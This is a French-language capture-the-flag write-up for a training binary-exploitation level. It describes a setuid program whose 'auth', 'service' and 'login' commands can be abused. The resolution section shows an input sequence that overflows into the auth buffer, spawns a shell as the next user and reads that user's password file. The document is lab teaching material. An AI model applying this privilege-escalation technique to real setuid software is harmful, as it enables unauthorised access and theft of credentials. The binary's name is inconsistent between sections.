## Comportement
- J'ai des droits `level8` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7*`
- En exécutant le binaire (`./level7`), on observe:
  ```shell
    ./level7 
    Segmentation fault (core dumped)
    ./level7 111
    Segmentation fault (core dumped)
    ./level7 111 222
    ~~
    ./level7 111 222 333
    ~~
  ```


## Analyse
- Une seule fonction `main()` qui exécute la commande `system("/bin/sh")` après une série de conditions. Il attend des commandes spécifiques de la part de l'utilisateur :
  -`auth` : copie les données suivant `auth` dans la variable globale `auth`.
  -`service` : copie les données suivant `service` dans la variable globale `service`.
  - `login` : appelle system() si auth[32] est différent de 0, sinon il appelle fwrite(). Ensuite, il affiche les adresses des variables globales auth et service.
- On voit que l'adresse de `service` est 16 bytes apres celle de `auth`.
  ```shell
    ./level8
    (nil), (nil)
    auth 
    0x804a008, (nil)
    service
    0x804a008, 0x804a018
  ```


## Résolution
- On cree `auth` et `service` pour qu'ils aient au moins 32 bytes de long (pour que `auth[32] != NULL`) sans oublier les 16 bytes de padding.
  ```shell
    ./level8
    (nil), (nil)
    auth 
    0x804a008, (nil)
    serviceBBBBBBBBBBBBBBB
    0x804a008, 0x804a018
    login
    $ whoami
    level9
    $ cat/home/user/level9/.pass
  ```
- On obtient directement le password. Il nous reste plus qu'a passer au level9 (`su level9`) en renseignant ce password.
